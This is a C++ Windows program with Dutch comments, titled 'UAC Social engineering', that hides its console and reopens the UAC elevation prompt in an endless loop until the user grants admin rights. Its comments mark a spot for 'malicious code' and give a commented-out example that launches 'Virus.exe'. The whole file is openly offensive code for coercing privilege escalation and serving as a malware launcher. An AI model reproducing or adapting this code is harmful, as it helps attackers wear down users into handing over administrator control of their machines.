#include <iostream>
#include <windows.h>
#include <WinUser.h>
#include <string>
using namespace std;

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Advapi32.lib")

/*
	UAC Social engineering
	Author:		ramb0
	Language:	c++
	Description:	UAC prompt social engineren
*/

bool CheckIfAdmin()
{
	BOOL RunAdmin = FALSE;
	HANDLE hToken = NULL;
	// Verkrijgen van process token van dit programma
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) 
	{
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		// Kijken of deze token "ge-elevated" is.
		if (GetTokenInformation(hToken, TokenElevation, 
			&Elevation, sizeof(Elevation), &cbSize)) 
		{
			// De token is admin, dus ge-elevated.
			RunAdmin = Elevation.TokenIsElevated;
		}
	}
	// Cleanup
	if (hToken) 
	{
		CloseHandle(hToken);
	}
	return RunAdmin;
}

bool Elevate()
{
	// Verkrijgen van pad naar programma
	char PathProg[MAX_PATH];
	if (GetModuleFileNameA(NULL, PathProg, MAX_PATH))
	{
		// We willen een programma uitvoeren vanuit deze
		// programma, maar dan met admin rechten
		SHELLEXECUTEINFOA SEIA = { sizeof(SEIA) };
		SEIA.lpVerb = "runas";	// runnen als admin
		SEIA.lpFile = PathProg; // programma pad, die we eerder verklaard hebben
		SEIA.hwnd = NULL;
		SEIA.nShow = SW_NORMAL;
		if (!ShellExecuteExA(&SEIA))
		{
			// Hier komt het lastigste gedeelte:
			// We blijven de UAC prompt prompten totdat de gebruiker ja zegt

			DWORD dwErr = GetLastError();
			if (dwErr == ERROR_CANCELLED)
			{
			// Gebruiker heeft nee gezegd op UAC prompt
				return false;
			}
			else
			{
				// Een andere error, maar dit is onwaarschijnlijk
				return false;
			}
		}
		else
		{
			// De gebruiker heeft ja gezegd op onze UAC prompt
			return true;
		}
	}
	return false;
}
int main()
{
	// De console scherm verbergen
	FreeConsole();

	// Eerst kijk je of al admin rechten heeft
	if (CheckIfAdmin() == false)
	{
		while (true)
		{
			if (Elevate() == false)
			{
				// De gebruiker heeft nog geen ja gezegd op onze UAC prompt verzoek
				continue;
			}
			else
			{
				// De gebruiker heeft ja gezegd op onze UAC prompt verzoek
				// dus we sluiten deze programma en laten de programma met de admin rechten
				// voortleven...
				exit(0);
			}
		}
	}
	
	// Doe je kwaadaardige code met je adminrechten hier.
	//...

	// BV: ShellExecuteA(); <- een virus ofs
	// ShellExecuteA(NULL, "open", "Virus.exe", NULL, NULL, SW_SHOWNORMAL);

	MessageBoxA(NULL, "You got adminrights!!!", "YES!", MB_OK | MB_ICONWARNING);

	return 0;
}
